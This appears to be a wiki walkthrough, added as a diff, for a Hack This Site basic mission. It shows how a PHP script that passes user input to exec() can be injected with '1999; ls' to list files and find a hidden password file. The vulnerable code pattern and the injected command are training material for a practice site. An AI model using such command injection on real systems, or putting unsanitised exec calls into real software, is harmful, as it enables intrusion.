@@ -1,0 +1,19 @@
+This mission requires basic knowledge of linux shell commands and operators. The command "ls" lists the contents of a directory, while the semicolon (";") character ends one command without requiring a newline / RET.
+<br>You need to end the "cal" command and run ls. The script being run is similar in effect to
+<pre>echo exec("cal ... ".$_POST['cal']);</pre>
+With a normal input (a 4 digit number) the code is effectively
+<pre>echo exec("cal ... 1999");</pre>
+We want to end the "cal" command and start the "ls" command, so we use a semicolon, making the input "1999; ls" and the code
+<pre>echo exec("cal ... 1999; ls");</pre>
+This should output the normal calendar information, and at the bottom there should be something like
+<pre>.
+..
+level7.php
+cal.pl
+
+index.php
+k1kh31b1n55h.php
+perl5.8.9.core</pre>
+Go to /basic/7/TheObscureFileYouJustFound.php . There's your password!
+
+[[Category:Hack This Site]]
